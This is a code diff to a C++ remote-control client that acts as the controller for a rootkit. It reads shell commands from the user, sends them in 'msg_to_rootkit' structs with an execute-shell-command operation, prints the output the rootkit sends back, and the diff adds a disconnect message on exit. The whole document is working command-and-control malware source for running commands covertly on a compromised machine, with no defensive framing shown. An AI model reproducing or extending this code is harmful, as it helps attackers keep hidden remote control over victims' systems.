@@ -1,7 +1,3 @@
-//
-// Created by idan on 1/21/24.
-//
-
 #include "remote_control_client.h"
 
 #include <iostream>
@@ -19,7 +15,7 @@ void remote_control_client::run() {
     client.connect();
 
     while (1) {
-        // todo: currently just only uses R_OPER_EXEC_SHELL_COMMAND
+        // currently just only uses R_OPER_EXEC_SHELL_COMMAND of the protocol
 
         std::string command;
         while (1) {
@@ -29,31 +25,30 @@ void remote_control_client::run() {
             if (ch == '\n')
                 break;
         }
-        if (command == "exit")
-            break;
+        if (command.starts_with("exit")) {
+            struct msg_to_rootkit msg;
+            memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
+            msg.id = R_OPER_DISCONNECT;
+            client.send_data(reinterpret_cast<const char *>(&msg), sizeof(struct msg_to_rootkit));
 
-// send command
+            break;
+        }
+
+        // send command
         struct msg_to_rootkit msg;
         memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
         msg.id = R_OPER_EXEC_SHELL_COMMAND;
         memcpy(msg.data, command.c_str(), std::min(command.length(), (size_t) MAX_MSG_TO_ROOTKIT_SZ));
 
-//        if (client.send_data(reinterpret_cast<const char *>(&msg), sizeof(struct msg_to_rootkit)) !=
-//            sizeof(struct msg_to_rootkit)) {
-//            std::cout << "message wasn't fully sent" << std::endl;
-//            continue;
-//        }
         client.send_data(reinterpret_cast<const char *>(&msg), sizeof(struct msg_to_rootkit));
-        std::cout << "sent message" << std::endl;
 
-// receive output
+        // receive output
         struct msg_to_controller msg_back;
         memset(&msg_back, '\x00', sizeof(struct msg_to_controller));
         client.recv_data(reinterpret_cast<char *>(&msg_back), sizeof(struct msg_to_controller));
 
         std::cout << "received data:" << std::endl;
         std::cout << msg_back.data << std::endl;
-//        std::cout.flush();
     }
 
     client.disconnect();
